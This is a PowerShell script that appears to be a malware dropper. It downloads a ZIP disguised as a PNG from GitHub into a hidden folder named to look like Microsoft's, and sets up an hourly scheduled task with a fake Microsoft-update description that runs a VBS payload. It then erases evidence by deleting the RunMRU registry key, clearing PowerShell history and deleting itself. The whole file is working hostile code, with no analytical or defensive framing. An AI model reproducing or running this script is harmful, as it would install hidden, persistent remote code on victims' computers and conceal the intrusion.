$url = "https://github.com/emakedie/UCN/raw/refs/heads/main/Mscn.png"
$destinationFolder = "C:\Users\$env:USERNAME\AppData\Local\Microsoft\MsUpdate"
$zipFile = Join-Path -Path $destinationFolder -ChildPath "Mscn.zip"

if (-not (Test-Path -Path $destinationFolder)) {
    New-Item -ItemType Directory -Path $destinationFolder -Force | Out-Null
    (Get-Item $destinationFolder).Attributes = "Hidden"
}

Invoke-WebRequest -Uri $url -OutFile $zipFile -ErrorAction SilentlyContinue


    Expand-Archive -Path $zipFile -DestinationPath $destinationFolder -Force -ErrorAction SilentlyContinue

    Get-ChildItem -Path $destinationFolder -Recurse | ForEach-Object {
        $_.Attributes = "Hidden"
    }

    Remove-Item -Path $zipFile -Force -ErrorAction SilentlyContinue

Unregister-ScheduledTask -TaskName "MscnSrvUpdate" -Confirm:$false -ErrorAction SilentlyContinue

$action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "C:\Users\$env:USERNAME\AppData\Local\Microsoft\MsUpdate\Mscntask.vbs"
$trigger = New-ScheduledTaskTrigger -Once -At "00:00AM" -RepetitionInterval (New-TimeSpan -Minutes 60) -RepetitionDuration (New-TimeSpan -Days 365)
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -StartWhenAvailable
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "MscnSrvUpdate" -Description "Mantiene actualizado el software de Microsoft. Si esta tarea está deshabilitada o detenida, el software de Microsoft no se actualizará, lo que significa que no se podrán corregir las vulnerabilidades que puedan surgir y es posible que las características no funcionen. Esta tarea se desinstalará cuando el software de Microsoft no la esté usando." -Settings $settings | Out-Null


$redistributableName = "Microsoft Visual C++ 2015-2022 Redistributable (x86)"
if (-not (Get-WmiObject -Query "SELECT * FROM Win32_Product WHERE Name = '$redistributableName'")) {
    $installerPath = "$env:USERPROFILE\AppData\Local\Microsoft\MsUpdate\vc_redist.x86.exe"
    if (-not (Test-Path $installerPath)) {
        Invoke-WebRequest -Uri "https://aka.ms/vs/17/release/vc_redist.x86.exe" -OutFile $installerPath
    }
    Start-Process -FilePath $installerPath -ArgumentList "/quiet", "/norestart" -Wait
}


Start-ScheduledTask -TaskName "MscnSrvUpdate"


$registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
Remove-Item -LiteralPath $registryPath -Force -ErrorAction SilentlyContinue

Clear-History
Remove-Item $env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt -ErrorAction SilentlyContinue

Remove-Item -Path .\psnc.ps1 -Force -ErrorAction SilentlyContinue

